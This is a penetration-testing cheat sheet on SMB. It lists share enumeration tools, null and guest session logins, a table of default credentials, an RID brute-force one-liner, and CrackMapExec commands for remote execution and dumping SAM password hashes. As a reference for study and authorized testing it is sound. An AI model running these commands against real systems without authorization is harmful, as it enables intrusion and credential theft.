# SMB

## **Introduction**

> * Server Message Block (SMB) is a client-server protocol that regulates access to files and entire directories and other network resources.
> * The SMB protocol enables the client to communicate with other participants in the same network to access files or services shared with it on the network.
> * An SMB server can provide arbitrary parts of its local file system as shares.
> * Access rights are defined by Access Control Lists (ACL).
> * SMB runs on port 445 TCP by default

***

## **SMB Shares Enumeration**

* Run [Snaffler](https://github.com/SnaffCon/Snaffler) _from a Windows host_ to find useful data in shares:\
  `.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data`
* Run [Scavenger](https://github.com/SpiderLabs/scavenger/tree/master) _from a Linux host_ to find useful data in shares:\
  `python3 ./scavenger.py smb -t 10.0.0.10 -u administrator -p Password123 -d testdomain.local`
* Shares enumeration from _Windows:_\
  `net view \MachineName /all`
* CME Shares Enumeration from _Linux_:\
  `sudo crackmapexec smb 172.16.5.5 -u validuser -p validpassword --shares`
* CME Share Spidering from _Linux_:\
  `sudo crackmapexec smb 172.16.5.5 -u validuser -p validpassword -M spider_plus --share sharename`
* SMBMap Share Enumeration from _Linux_:\
  `smbmap -u validuser -p validpassword -d INLANEFREIGHT.LOCAL -H 172.16.5.5`
* SMBMap Share Recursive Directory Listing from _Linux_\
  `smbmap -u validuser -p validpassword -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SHARENAME --dir-only`
* Download Shares Recursively from _Linux_:\
  `smbget -u guest -R smb://10.129.8.111/Development/`

***

## **SMB NULL Session, Guest and Common Credentials Authentication**

* **Guest Authentication:** `enum4linux -a -u "guest" -p "" <DC IP>`
* **Guest Authentication:** `smbmap -u "guest" -p "" -P 445 -H <DC IP>`
* **Guest Authentication:** `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
* **NULL Session:** `smbclient -N -L //<FQDN/IP>`
* **NULL Session:** `crackmapexec smb <FQDN/IP> --shares -u '' -p ''`
* **NULL Session:** `smbmap -u "" -p "" -P 445 -H <DC IP>`
* **NULL Session:** `enum4linux -a -u "" -p "" <DC IP>`
* Check for common SMB credentials, as listed below

***

## **Common SMB Credentials**

Source: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#possible-credentials](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#possible-credentials)

| Common Username(s)   | Common Password                         |
| -------------------- | --------------------------------------- |
| (blank)              | (blank)                                 |
| guest                | (blank)                                 |
| Administrator, admin | (blank), password, administrator, admin |
| arcserve             | arcserve, backup                        |
| tivoli, tmersrvd     | tivoli, tmersrvd, admin                 |
| backupexec, backup   | backupexec, backup, arcada              |
| test, lab, demo      | password, test, lab, demo               |

***

## **Enumerating SMB via RPC Client**

The rpcclient utility offers us many different requests with which we can execute specific functions on the SMB server to get information.

| Command (Query) | Description                                                        |
| --------------- | ------------------------------------------------------------------ |
| srvinfo         | Server information.                                                |
| enumdomains     | Enumerate all domains that are deployed in the network.            |
| querydominfo    | Provides domain, server, and user information of deployed domains. |
| netshareenumall | Enumerates all available shares.                                   |
| netsharegetinfo | Provides information about a specific share.                       |
| enumdomusers    | Enumerates all domain users.                                       |
| queryuser       | Provides information about a specific user.                        |

**Bruteforcing user RIDs:**

* Oneliner:\
  `for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done`
* Impacket Samrdump: `samrdump.py 10.129.14.128`

***

## **CrackMapExec (CME) Utilities**

| Description                                            | Command                                                                                              |
| ------------------------------------------------------ | ---------------------------------------------------------------------------------------------------- |
| Run commands with CrackMapExec                         | `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec` |
| Enumerate logged on users with CrackMapExec            | `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`                |
| Extract Hashes from the SAM Database with CrackMapExec | `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`                             |
| Enumerate Password Policies                            | `crackmapexec smb 172.16.5.5 -u validuser -p validpass --pass-pol`                                   |
